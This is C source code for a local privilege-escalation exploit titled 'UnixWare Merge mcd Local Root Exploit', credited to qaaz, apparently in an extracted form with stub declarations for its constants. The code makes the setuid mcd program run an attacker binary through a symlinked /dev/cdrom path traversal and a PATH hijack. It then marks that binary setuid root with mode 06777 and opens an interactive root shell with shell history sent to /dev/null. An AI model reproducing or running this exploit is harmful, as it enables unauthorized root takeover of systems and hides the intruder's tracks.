
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int st_mode; } ;
typedef int pid_t ;
typedef int env ;
typedef int dev ;


 char* BIN ;
 int DEV ;
 char* DIR ;
 int EX_OK ;
 char* LNK ;
 char* TARGET ;
 scalar_t__ access (char*,int ) ;
 int chdir (char*) ;
 int chmod (char*,int) ;
 int chown (char*,int ,int) ;
 int errno ;
 int execl (char*,char*,char*,...) ;
 int fork () ;
 char* getcwd (int *,int) ;
 int getegid () ;
 char* getenv (char*) ;
 scalar_t__ geteuid () ;
 int getppid () ;
 int kill (int ,int) ;
 int printf (char*,...) ;
 int putenv (char*) ;
 int setgid (int ) ;
 int setuid (scalar_t__) ;
 int sleep (int) ;
 int snprintf (char*,int,char*,char*,...) ;
 int sprintf (char*,char*,...) ;
 scalar_t__ stat (char*,struct stat*) ;
 char* strerror (int ) ;
 scalar_t__ strstr (char*,char*) ;
 scalar_t__ symlink (int ,char*) ;
 int umask (int ) ;
 int unlink (char*) ;

int main(int argc, char *argv[])
{
 char dir[4096], bin[4096];
 char dev[4096], env[4096];
 pid_t child;
 struct stat st;

 if (geteuid() == 0) {
  setuid(geteuid());
  setgid(getegid());
  if (strstr(argv[0], BIN)) {
   umask(0);
   chown(BIN, 0, 3);
   chmod(BIN, 06777);
   kill(getppid(), 15);
   return 0;
  }
  putenv("HISTFILE=/dev/null");
  execl("/bin/sh", "sh", "-i", ((void*)0));
  printf("[-] sh: %s\n", strerror(errno));
  return 1;
 }

 printf("---------------------------------------\n");
 printf(" UnixWare Merge mcd Local Root Exploit\n");
 printf(" By qaaz\n");
 printf("---------------------------------------\n");

 if (access(TARGET, EX_OK) < 0) {
  printf("[-] %s: %s\n", TARGET, strerror(errno));
  return 1;
 }

 if (symlink(DEV, LNK) < 0) {
  printf("[-] %s: %s\n", LNK, strerror(errno));
  return 1;
 }

 sprintf(dir, DIR);
 sprintf(bin, "%s/%s", dir, BIN);

 snprintf(dev, sizeof(dev), "/dev/cdrom/../../%s/%s", getcwd(((void*)0), 4096), LNK);
 snprintf(env, sizeof(env), "PATH=.:%s", getenv("PATH"));

 if ((child = fork()) == 0) {
  chdir(dir);
  putenv(env);
  execl(TARGET, TARGET, "-u", "-d", dev, ((void*)0));
  printf("[-] %s: %s\n", TARGET, strerror(errno));
  return 1;
 }


 printf("[*] Waiting for privs...\n");
 while (stat(bin, &st) == 0) {
  if ((st.st_mode & 06777) == 06777) {
   printf("[+] Enjoy\n");
   unlink(LNK);
   execl(bin, "woot", ((void*)0));
   printf("[-] %s: %s\n", bin, strerror(errno));
   return 1;
  }
  sleep(1);
 }
 printf("[-] %s: %s\n", bin, strerror(errno));
 unlink(LNK);
 return 0;
}
